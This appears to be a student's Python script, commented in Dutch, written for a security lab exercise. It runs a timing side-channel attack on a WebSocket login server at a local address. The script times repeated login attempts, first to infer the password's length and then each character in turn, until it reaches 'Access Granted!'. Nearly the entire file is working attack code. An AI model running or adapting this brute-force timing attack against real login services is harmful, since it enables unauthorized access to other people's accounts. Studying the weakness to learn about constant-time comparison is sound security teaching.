# Importeren van benodigde bibliotheken
from socket import *
from sys import *
import asyncio
import websockets
import json
import time
from statistics import *

async def client_stub(username, password):
    """Behandelt het verzenden en ontvangen van inloggegevens van/naar de server.
    De 'while True'-structuur voorkomt dat enkele netwerk-/socketfouten de volledige code laten mislukken.

    Parameters
    ----------
        username -- tekenreeks met student-ID voor inlogpoging
        password -- tekenreeks met wachtwoord voor inlogpoging

    Retourneert
    -------
        reply -- tekenreeks met het antwoord van de server op de inlogpoging
    """
    # Serveradres voor WebSocket-verbinding
    server_address = "ws://192.168.1.10:3840"
    err_count = 0
    
    while True:
        try:
            # Tijd meten vóór de verbindingspoging
            time_before = time.perf_counter()
            
            # Verbinden met de server via websockets
            async with websockets.connect(server_address) as websocket:
                # Inloggegevens in JSON-indeling naar de server sturen
                await websocket.send(json.dumps([username, password]))
                # Het antwoord van de server ontvangen
                reply = await websocket.recv()
            
            # Tijd meten na de verbindingspoging
            time_after = time.perf_counter()
            # De tijd voor de verbindingspoging berekenen
            time_delta = time_after - time_before
            
            # Foutenteller resetten als er eerder fouten waren
            if err_count != 0:
                print(err_count)
                err_count = 0
            
            return json.loads(reply), time_delta
        
        except:
            # Foutenteller verhogen als een uitzondering optreedt (bijv. netwerk-/socketfout)
            err_count += 1
            continue

async def call_server(username, password):
    """Functie om met de server te communiceren en een reactie te ontvangen.

    Parameters
    ----------
        username -- tekenreeks met student-ID voor inlogpoging
        password -- tekenreeks met wachtwoord voor inlogpoging (gebruikt in de functie guess_password)

    Retourneert
    -------
        reply -- tekenreeks met het antwoord van de server op de inlogpoging
    """
    # Roep de client_stub-functie aan om inloggegevens te versturen en de responstijd te meten
    reply, time_delta = await client_stub(username, password)
    
    # Controleren of het antwoord van de server wijst op een geslaagde inlogpoging
    if reply[-15:] == 'Access Granted!':
        print('Correct wachtwoord gevonden: {}'.format(password))
    else:
        print('Onjuist wachtwoord: {}'.format(password))
    
    return reply, time_delta

async def guess_password(username):
    """Probeert de lengte en tekens van het wachtwoord te raden met behulp van een side-channel-aanval.

    Parameters
    ----------
        username -- tekenreeks met student-ID voor inlogpoging

    Retourneert
    -------
        password -- het geraden wachtwoord
    """
    # Wachtwoorden met verschillende lengtes om te raden
    passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"]
    
    max_average_time = 0
    guessed_length = 0
    
    # Itereren door verschillende wachtwoordlengtes
    for password in passwords:
        total_time = 0
        num_attempts = 50
        
        # Voer meerdere pogingen uit voor elke wachtwoordlengte
        for a in range(num_attempts):
            # Voeg een kleine vertraging toe om snelle pogingen te voorkomen
            time.sleep(0.001)
            info = await client_stub("000000", password)
            total_time += info[1]
            print("Verstreken totale tijd:", total_time, "seconden")
        
        # Bereken de gemiddelde tijd voor de huidige wachtwoordlengte
        average_time = total_time / num_attempts
        print("Gemiddelde tijd voor wachtwoord '{}': {}".format(password, average_time))
        
        # Werk de geraden wachtwoordlengte bij op basis van de maximale gemiddelde tijd
        if average_time > max_average_time:
            max_average_time = average_time
            guessed_length = len(password)
    
    print("Geraden wachtwoordlengte:", guessed_length)
    
    # Variabelen voor het raden van het wachtwoord
    password_length = guessed_length
    password = ""
    characters = "abcdefghijklmnopqrstuvwxyz1234567890"  # Alleen het eerste teken wordt gebruikt
    
    # Loop om elk teken van het wachtwoord te raden
    while len(password) < password_length:
        max_average_time = float("-inf")
        next_char = None
        
        # Itereren door mogelijke tekens
        for char in characters:
            response_times = []
            
            # Voer meerdere pogingen uit voor elk teken om nauwkeurige responstijden te verkrijgen
            for _ in range(50):  # aantal keer proberen (verhogen indien nodig)
                guess = password + char + "0" * (password_length - len(password) - 1)
                time.sleep(0.001)
                _, response_time = await client_stub(username, guess)
                response_times.append(response_time)
                print(f"Radend '{guess}' -> Responstijd: {response_time}")
            
            # Bereken het gemiddelde van de responstijden
            average_time = sum(response_times) / len(response_times)
            print(f"Gemiddelde responstijd voor teken '{char}': {average_time}")
            
            # Update het volgende teken op basis van de maximale gemiddelde tijd
            if next_char is None or average_time > max_average_time:
                max_average_time = average_time
                next_char = char
        
        print(f"Volgend teken om te proberen: '{next_char}' met gemiddelde tijd: {max_average_time}")
        password += next_char
        print(f"Wachtwoord tot nu toe: {password}")
    
    # Roep de server aan met het gegenereerde wachtwoord
    await call_server(username, password)
    
    return password

async def main():
    # Voeg de gebruikersnaam van de student in voor de inlogpoging
    username = "000000"
    # Roep de guess_password-functie aan om de wachtwoordgokaanval uit te voeren
    await guess_password(username)

# Voer de hoofdfunctie uit met asyncio
asyncio.run(main())
